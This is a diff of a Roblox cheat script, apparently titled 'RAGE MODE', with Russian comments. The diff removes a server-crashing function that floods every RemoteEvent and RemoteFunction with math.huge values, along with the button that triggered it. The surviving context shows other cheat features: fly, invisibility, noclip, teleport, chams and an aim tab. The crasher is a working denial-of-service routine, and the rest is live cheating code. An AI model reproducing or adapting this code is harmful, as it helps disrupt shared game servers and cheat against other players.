@@ -33,29 +33,6 @@ local cachedServices = {
     TweenService = vT
 }
 
--- === УЛУЧШЕНИЕ 5: Крашер сервера ===
-local function CrashServer()
-    local events = {}
-    for _, obj in ipairs(game:GetDescendants()) do
-        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-            table.insert(events, obj)
-        end
-    end
-    
-    for i = 1, 100 do
-        for _, event in ipairs(events) do
-            pcall(function()
-                if event:IsA("RemoteEvent") then
-                    event:FireServer(math.huge, {}, Vector3.new(math.huge, math.huge, math.huge), CFrame.new(), Instance.new("Part"))
-                else
-                    event:InvokeServer(math.huge, {}, Vector3.new(math.huge, math.huge, math.huge), CFrame.new(), Instance.new("Part"))
-                end
-            end)
-        end
-        vR.Heartbeat:Wait()
-    end
-end
-
 -- Основной GUI
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "RageModeUI_"..tostring(math.random(10000,99999))
@@ -84,7 +61,7 @@ UIStroke.Parent = MainFrame
 
 -- Заголовок
 local Title = Instance.new("TextLabel")
-Title.Text = "⚡ RAGE MODE V1.14"
+Title.Text = "⚡ RAGE MODE V1.2"
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 20
 Title.TextColor3 = Color3.new(1, 1, 1)
@@ -352,19 +329,12 @@ local PlayerTab = TabFrames.Player
 local VisualsTab = TabFrames.Visuals
 local AimTab = TabFrames.Aim
 
--- Player Tab (ДОБАВЛЕН КРАШЕР)
+-- Player Tab
 local FlyBtn = CreateButton(PlayerTab, "FLY: OFF")
 local FlySpeedSlider = CreateSlider(PlayerTab, "Fly Speed:", 20, 500, 100)
 local InvisBtn = CreateButton(PlayerTab, "INVISIBLE: OFF")
 local TPBtn = CreateButton(PlayerTab, "TELEPORT TO MOUSE")
 local NoclipBtn = CreateButton(PlayerTab, "NOCLIP: OFF")
-local CrashBtn = CreateButton(PlayerTab, "CRASH SERVER") -- НОВАЯ КНОПКА
-
--- Обработчик крашера
-CrashBtn.MouseButton1Click:Connect(function()
-    CrashBtn.Text = "CRASHING..."
-    task.spawn(CrashServer)
-end)
 
 -- Visuals Tab
 local ChamsBtn = CreateButton(VisualsTab, "PLAYER CHAMS: OFF")
